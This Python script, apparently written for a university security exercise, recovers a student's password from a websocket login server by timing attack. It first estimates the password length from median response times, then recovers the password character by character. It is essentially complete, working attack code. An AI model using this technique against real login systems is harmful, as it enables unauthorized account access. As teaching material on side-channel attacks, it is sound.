import asyncio, websockets
from json import dumps, loads
from time import sleep, perf_counter
import string, statistics

async def client_connect(username, password, variance=0.10): # variance=0.10
    """Handle sending and receiving logins to & from the server.
    'while True' structure prevents singular network/socket
    errors from causing full crash.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum network delay

    Returns
    -------
        reply -- string of server's response to login attempt
        duration -- Time in seconds between sending the request and receiving the reply.
    """

    server_address = "ws://20.224.193.77:8080"
    #server_address = "ws://127.0.0.1:8080"
    #server_address = "ws://192.168.178.190:3840"

    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                await websocket.send(dumps([username,password,variance])) #variance
                t0 = perf_counter()
                reply = await websocket.recv()
                t1 = perf_counter()
                
            return loads(reply), t1 - t0
        except:
            continue

def call_server(username, password, variance= 0.002): # variance=0.001
    """Send a login attempt of username + password to the server
    and return the response. Optionally takes the variable variance to
    allow simulation of random network delays; the server will then
    delay its response by n microseconds, where 0 < n < variance.
    A higher variance will make guessing the password harder.


    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum delay, must be greater than 0.000001

    Returns
    -------
        reply -- string of server's response to login attempt
        duration -- Time in seconds between sending the request and receiving the reply.
    """

    
    reply, duration = asyncio.run(client_connect(username, password, variance))
    sleep(0.001)
    
    return reply, duration


def score_guess(student, guess, samples=50):
    """
    Measure the timing score for a specific password guess.

    The function sends the same password guess multiple times and
    returns the median response time to reduce the effect of network noise.

    Parameters
    ----------
    student : str
        Student ID used for the login attempt.
    guess : str
        Password guess to test.
    samples : int
        Number of timing measurements to perform.

    Returns
    -------
    tuple
        reply : str
            Server reply from the final request.
        median_time : float
            Median response time across all samples.
    """

    # warm-up
    call_server(student, guess)
    times = []

    for _ in range(samples):
        reply, duration = call_server(student, guess)
        times.append(duration)

    return reply, statistics.median(times)

def score_length(student, length, samples=15):
    """
    Estimate the correct password length using timing analysis.

    The function sends password guesses consisting of repeated characters
    and measures the response time. The correct length usually results
    in a longer response time because the server compares each character.

    Parameters
    ----------
    student : str
        Student ID used for the login attempt.
    length : int
        Password length to test.
    samples : int
        Number of timing measurements.

    Returns
    -------
    float
        Median response time for this tested password length.
    """

    guess = "a" * length
    times = []

    # warm-up
    call_server(student, guess)

    for _ in range(samples):
        reply, duration = call_server(student, guess)
        times.append(duration)

    return statistics.median(times)


# -------------------------------
# Determine password length
# -------------------------------

student = "490834"
length_results = []

for length in range(1, 20):

    score = score_length(student, length)

    length_results.append((length, score))

    print("Length:", length, "Score:", score)

password_length = max(length_results, key=lambda x: x[1])[0]

print("Gevonden lengte:", password_length)


# ----------------------------------------
# Recover password character by character
# ----------------------------------------

chars = string.ascii_lowercase + string.digits
found = ""

for p in range(password_length):

    results = []   # elke ronde resetten

    for c in chars:
        guess = (found + c).ljust(password_length, "a")

        score, duration = score_guess(student, guess)

        print(guess, c, duration)

        results.append((guess, c, duration))

    best = max(results, key=lambda x: x[2])
    best_letter = best[1]

    found += best_letter

    print("Beste letter:", best_letter)
    print("Tot nu toe:", found)

reply, duration = call_server(student, found)
print("Server reply:", reply)